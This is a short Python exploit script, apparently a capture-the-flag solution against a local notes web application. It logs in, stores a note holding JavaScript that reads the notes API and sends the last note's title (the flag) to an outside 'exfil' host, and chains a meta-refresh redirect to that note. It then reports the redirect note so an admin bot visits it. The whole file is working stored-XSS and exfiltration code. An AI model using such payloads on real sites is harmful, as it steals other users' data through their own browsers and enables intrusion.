
import requests

host = 'http://localhost:8000'
exfil = 'https://exfil'

s = requests.Session()

print('logging in...')
# login
d = {
    'email': 'a',
    'password': 'a'
    }
r = s.post(f'{host}/api/auth/login', data=d, allow_redirects=False)

print('posting js...')
# post js
d = {
    'title': '<html>',
    'content': f'''<body>
        <script>
            fetch('/api/notes')
            .then(r => r.json())
            .then(json => {{
                const flag = json[json.length-1].title;
                window.location = `{exfil}/flag=${{flag}}`;
            }});
        </script>
    </body>
</html>'''
    }
r = s.post(f'{host}/api/notes', data=d, allow_redirects=False)
post_id = r.json()['id']

print('posting redirect...')
# post redirect
d = {
    'title': 'meow',
    'content': f'''<meta http-equiv="refresh" content="0; url=/api/notes/{post_id}">'''
    }
r = s.post(f'{host}/api/notes', data=d, allow_redirects=False)
post_id = r.json()['id']


print('sending bot...')
# report
d = {
    'noteId': post_id
    }
r = s.post(f'{host}/report', data=d, allow_redirects=False)
